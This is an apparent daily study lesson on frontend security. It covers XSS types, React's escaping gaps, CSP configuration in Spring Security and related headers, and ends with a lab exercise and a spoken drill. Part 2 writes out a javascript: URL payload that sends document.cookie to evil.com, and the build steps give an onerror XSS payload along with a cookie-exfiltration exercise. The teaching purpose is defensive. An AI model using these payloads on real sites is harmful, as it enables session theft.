# Day 243 🛡️

**J-243** · 🛡️ **Frontend security** — ⭐⭐ XSS, and the control that survives your mistake

**Time:** 3 hrs · **Mode:** NEW

> ⭐⭐ **The sentence to own: XSS means an attacker's JavaScript runs with your origin's full authority
> — it can read anything the user can see, act as them, and exfiltrate silently — and because one of
> your several hundred dependencies can introduce it without you writing a line, the control that

> Today: ⭐ the three types, ⭐⭐ React's protection and its exact holes, CSP, and the other four.

# Part 1 — What XSS actually gets you

```
⭐⭐ ATTACKER JS ON YOUR ORIGIN CAN:
⭐   · ⭐ READ localStorage ⇒ steal the token (Day 235)
⭐   · ⭐⭐ MAKE AUTHENTICATED REQUESTS AS THE USER — HttpOnly does
⭐     NOT stop this. The cookie is attached automatically, and your
⭐     @PreAuthorize passes, because it IS the user.
⭐   · read the DOM ⇒ ⭐ everything on screen, including typing
⭐   · keylog the password field
⭐   · ⭐⭐ REWRITE THE PAGE — a fake login form on your real domain,
⭐     with your real padlock. THE USER CANNOT TELL.

⭐   ⇒ ⭐⭐ "IT'S JUST AN ALERT BOX" IS THE DEMO. THE CAPABILITY IS
⭐     TOTAL CONTROL OF YOUR APP FOR THAT USER.
```

| ⭐ Type | How |
|---|---|
| **Stored** | ⭐⭐ Payload saved in your DB, served to **every** viewer. **The worst.** |
| **Reflected** | ⭐ Payload in a URL, echoed into the page |
| **DOM-based** | ⭐⭐ Never touches your server — `location.hash` written into `innerHTML`. **Your access logs show nothing.** |

# Part 2 — ⭐⭐ React's protection, and its four holes

```jsx
<div>{userInput}</div>
// ⭐⭐ SAFE. React escapes it — like Thymeleaf's th:text.
```

```jsx
// ❌ HOLE 1 — the named one
<div dangerouslySetInnerHTML={{ __html: userHtml }} />
// ⭐⭐ CALLED "dangerously" ON PURPOSE. ⭐ It is th:utext, and it
//    carries the same warning. SANITISE FIRST — and ⭐ SANITISE ON
//    THE SERVER (OWASP Java HTML Sanitizer), or on both.

// ❌ HOLE 2 — URLs. ⭐⭐ REACT DOES NOT VALIDATE THESE.
<a href={userUrl}>click</a>
// ⇒ userUrl = "javascript:fetch('//evil.com?c='+document.cookie)"
// ✅ const safe = /^https?:\/\//i.test(url) ? url : "#";

// ❌ HOLE 3 — spreading unknown props
<div {...userControlledObject} />        // ⭐ can inject onError, etc.

// ❌ HOLE 4 — an SVG or file uploaded by a user, served from YOUR origin
// ⭐⭐ AN .svg IS A DOCUMENT AND CAN CONTAIN <script>. Serving it
//    from your domain executes it AS your origin. ⭐ Separate origin,
//    Content-Disposition: attachment.
```

| ⭐ Also | |
|---|---|
| `eval`, `new Function` | ⭐ Never with anything user-influenced |
| `element.innerHTML =` in an effect | ⭐⭐ You left React's protection entirely |
| Markdown renderers | ⭐ Many allow raw HTML by default. **Check the config.** |

# Part 3 — ⭐⭐ CSP, the control that survives your mistake

```java
// ⭐ Spring Security makes this a few lines
http.headers(h -> h
    .contentSecurityPolicy(csp -> csp.policyDirectives(
        "default-src 'self'; " +
        "script-src 'self' 'nonce-{random}'; " +   // ⭐⭐ NO 'unsafe-inline'
        "img-src 'self' data: https://cdn.example.com; " +
        "connect-src 'self' https://api.example.com; " +  // ⭐⭐ EXFILTRATION
        "frame-ancestors 'none'; base-uri 'self'; object-src 'none'"))
    .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true))
    .referrerPolicy(r -> r.policy(STRICT_ORIGIN_WHEN_CROSS_ORIGIN)));
```

```
⭐⭐ WHY CSP IS THE HIGHEST-VALUE HEADER YOU CAN SET

⭐   ⭐ IT ASSUMES YOU WILL HAVE AN XSS BUG. With ~900 dependencies
⭐     that is REASONABLE, not pessimistic.
⭐   ⇒ ⭐⭐ script-src 'self' MEANS INJECTED INLINE SCRIPT DOES NOT
⭐     RUN AT ALL — the bug exists and the exploit does not.
⭐   ⇒ ⭐⭐ connect-src MEANS EVEN IF SCRIPT RUNS, IT CANNOT SEND THE
⭐     DATA TO evil.com. ⭐ THAT IS EGRESS FILTERING, FOR THE BROWSER
⭐     — the same control you would put on a server's outbound rules.

⭐   ⭐⭐ 'unsafe-inline' IN script-src DISABLES ESSENTIALLY ALL OF
⭐     THIS. ⭐ It is also the easiest way to make a CSP "work", which
⭐     is why most real CSPs are decorative.
```

| ⭐ Header | Does |
|---|---|
| ⭐⭐ `Content-Security-Policy` | The one that matters |
| `Strict-Transport-Security` | ⭐ Forces HTTPS |
| `X-Content-Type-Options: nosniff` | ⭐ Stops a .txt being executed as JS |
| `Referrer-Policy` | ⭐⭐ Stops leaking full URLs (with ids) to third parties |

> ⭐ **Deploy CSP in `Report-Only` first.** Collect violations for a week, fix, then enforce. A CSP
> enforced on day one breaks the site and gets reverted — which is how teams end up with none.

# Part 4 — The other four

| ⭐ Risk | ⭐⭐ Control |
|---|---|
| **Clickjacking** | ⭐ `frame-ancestors 'none'`. ⭐⭐ Note this **supersedes `X-Frame-Options`**, which Spring sets by default. |
| **`target="_blank"`** | ⭐⭐ Add `rel="noopener noreferrer"`. Without it the opened page can **redirect your tab to a phishing page**. |
| **Supply chain** | ⭐ Day 221. ⭐⭐ A compromised dependency **is** an XSS you did not write — the whole argument for CSP. |
| **Secrets in the bundle** | ⭐ Day 222. Grep `dist/` in CI. |

```
⭐⭐ AND THE ONE THAT IS NOT A FRONTEND FIX AT ALL:
⭐   ⭐ EVERY INPUT VALIDATED ON THE CLIENT IS ALSO VALIDATED BY
⭐     @Valid (Day 229), AND EVERY AUTHORIZATION DECISION IS
⭐     @PreAuthorize's (Day 236).
⭐   ⇒ ⭐⭐ FRONTEND SECURITY PROTECTS THE **USER** IN THEIR BROWSER.
⭐     PROTECTING THE **DATA** HAPPENS ON THE SERVER.
⭐     ⭐ CONFUSING THE TWO IS THE ROOT MISTAKE.
```

## Today's build

1. ⭐⭐ **Give yourself stored XSS.** Save `<img src=x onerror=alert(1)>` through your own API, render with `dangerouslySetInnerHTML`. **Then change the payload to send `document.cookie` to a listener you control.**
2. ⭐ Sanitise — DOMPurify client-side, OWASP Java HTML Sanitizer server-side. Re-run both payloads.
3. ⭐⭐ Add a `javascript:` URL to an `<a href>` from user data. Click it.
4. ⭐⭐ **Add a CSP in Report-Only** via Spring Security. Collect violations, then enforce and confirm your injected script no longer runs **even though the bug is still there.**
5. ⭐ Add `connect-src` and confirm the exfiltration `fetch` is blocked.
6. ⭐ Test `target="_blank"` with and without `rel="noopener"`.

## 🎙️ Articulation drill

⭐⭐ **Two minutes: "how do you think about frontend security?"**

Start with the capability. **XSS means an attacker's JavaScript runs with my origin's full authority.
It reads the DOM, keylogs the password field, and makes authenticated requests as the user — HttpOnly
doesn't stop that, the cookie is attached automatically and my `@PreAuthorize` passes, because it *is*
the user. It can rewrite the page into a fake login form on my real domain. "It's just an alert box" is
the demo; the capability is total control.**

Then React's protection and its limits. **React escapes interpolated values, like `th:text`. The holes
are `dangerouslySetInnerHTML`, which is `th:utext` and carries the same warning; URLs, because React
doesn't validate them and a `javascript:` href executes; spreading unknown props; and user-uploaded
SVGs, which are documents that can contain script and run as my origin.**

Then the control that matters. **CSP, because it assumes I will have an XSS bug — with hundreds of
dependencies that's reasonable, not pessimistic. With `script-src 'self'`, injected inline script
doesn't run at all: the bug exists and the exploit doesn't. And `connect-src` means even if script runs
it can't send the data anywhere — egress filtering for the browser, the same control I'd put on a
server's outbound rules. The catch is `unsafe-inline`, which disables essentially all of it and is also
the easiest way to make a CSP "work".**

Close on the boundary. **Frontend security protects the user in their browser. Protecting the data
happens on the server — every client validation is repeated by `@Valid`, and every authorization
decision is `@PreAuthorize`'s. Confusing those two is the root mistake.**
